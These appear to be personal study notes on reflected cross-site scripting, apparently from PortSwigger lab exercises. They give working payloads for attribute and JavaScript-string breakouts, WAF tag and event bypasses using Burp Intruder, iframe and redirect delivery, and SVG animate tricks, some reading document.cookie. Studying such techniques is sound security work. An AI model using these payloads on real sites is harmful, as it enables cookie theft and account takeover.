# reflected examples

## break out converted angle brackets

in case of input convert the

- `<` -> `&lt;`
- `>` -> `&gt;`

might need to break out from the input like:

`/?search="onmouseover="alert()`

wht really looks like ->

`/?search="onmouseover%3D"alert%28%29`

that will add the `onmouseover="alert()"` to the input ->

`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert()">`

## break out javascript encodeURIComponent function

in case of:

```
<script>
var searchTerms = 'duck';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=duck">
```

can break out from search terms like

`'' - NaN - ''` -> NaN

it try to negate the `NaN` from `''` -> can replace NaN with a function like `alert()`

`'' - alert() - ''`

so instead of duck it will look like

`var searchTerms = ''-alert()-'';`

that results

```
<script>
var searchTerms = ''-alert()-'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=NaN">
```

so the two `''` want to make a mathematical operation with `alert()`, but `alert()` needs to be executed first

## search input blocks tags/attributes/interaction

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

`/?search=...` -> WAF blocks most of the tags, but not all

> check the working ones in burp intruder

`GET /?search=<$$> HTTP/2` -> start an attack with all the html tags

> check for not blocked attributes the same way

`GET /?search=<body $$=1 > HTTP/2` -> start an attack with all the events

`GET /?search=<body onresize="alert()" > HTTP/2` -> this works on resize interaction but, interaction is "blocked", so lets place it in an iframe and sent that to the target

`<iframe src="https://xzy.com/?search=%3Cbody+onresize%3D%22print%28%29%22%3Educk%3C%2Fbody%3E" onload=this.style.width="100px" />`

`/?search=%3Cbody+onresize%3D%22print%28%29%22%3Educk%3C%2Fbody%3E"`

this eventually the same as

`/?search=<body onresize="print()">duck</body>`

the iframe is automatically resize on load

## search input blocks only none custom tags

> create a custom tag for the search

`<duck onfocus="alert(document.cookie)" id="x" tabindex="1">quack</duck>`

- if the duck tag get focused it will trigger the alert
- the `tabindex` makes it focusable\
- the `id` makes it recognizable by the `url`

> insert it in the url

`/?search=<duck onfocus="alert(document.cookie)" id="x" tabindex="1">quack</duck>#x`

this should trigger the alert function

> redirecting the target to the malicious url

```
<script>
    loaction = "http://xyz.com/?search=<duck onfocus="alert(document.cookie)" id="x" tabindex="1">quack</duck>#x"
</script>
```

## svg trick

> similar as the first one burp tag/attribute search

`/?search=<svg><animatetransform onbegin="alert()">`

> might have to use `%20` instead of space

`/?search=<svg><animatetransform%20onbegin="alert()">`

## href blocked on a tag

> `svg` -> `animate` acceptable and `animate` can set parent element attribute

`/?search=<svg><a><animate attributeName="href" values="javascript:alert()" /></a></svg>`

- this tells to the `a` tag to have the `href="javascript:alert()"` attribute-value

> now just give a text to the anchor tag with `text` tag

`<svg><a><animate attributeName="href" values="javascript:alert()" /><text x=20 y=20>Click me</text></a></svg>`
